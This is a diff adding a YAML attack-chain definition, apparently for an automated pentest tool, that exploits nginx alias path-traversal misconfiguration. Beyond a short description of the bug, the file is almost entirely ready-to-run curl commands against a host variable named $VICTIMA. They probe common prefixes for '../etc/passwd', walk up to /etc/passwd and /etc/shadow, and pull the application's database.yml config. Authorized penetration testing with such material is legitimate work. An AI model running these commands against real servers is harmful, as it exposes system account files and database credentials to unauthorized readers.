@@ -1,0 +1,35 @@
+chain_id: nginx_alias_traversal
+title: "nginx — alias / traversal misconfig (... /static../ → above docroot)"
+severity: HIGH
+tags: [web, nginx, alias, path-traversal]
+
+trigger:
+  any_of:
+    - { product_pattern: "(?i)nginx" }
+    - { banner_pattern: "(?i)nginx" }
+
+description: |
+  When nginx is configured with `location /static { alias /var/www/app/static/; }`
+  and `/static` is missing a trailing slash, requests like `/static../`
+  resolve outside the alias root. Same bug, simpler form: `/static../etc/passwd`.
+
+steps:
+  - id: 1
+    title: "Probe known alias prefixes"
+    command: |
+      for prefix in /static /assets /content /media /img /docs; do
+        echo "== $prefix =="
+        curl -s -o /dev/null -w '%{http_code}\\n' "http://$VICTIMA${prefix}../etc/passwd"
+        curl -s -o /dev/null -w '%{http_code}\\n' "http://$VICTIMA${prefix}/../etc/passwd"
+      done
+
+  - id: 2
+    title: "On a 200, walk up to /etc/passwd / /etc/shadow"
+    command: curl "http://$VICTIMA/static../../../etc/passwd"
+
+  - id: 3
+    title: "Source disclosure of the app config"
+    command: curl "http://$VICTIMA/static../../app/config/database.yml"
+
+references:
+  - https://www.acunetix.com/vulnerabilities/web/nginx-misconfiguration/
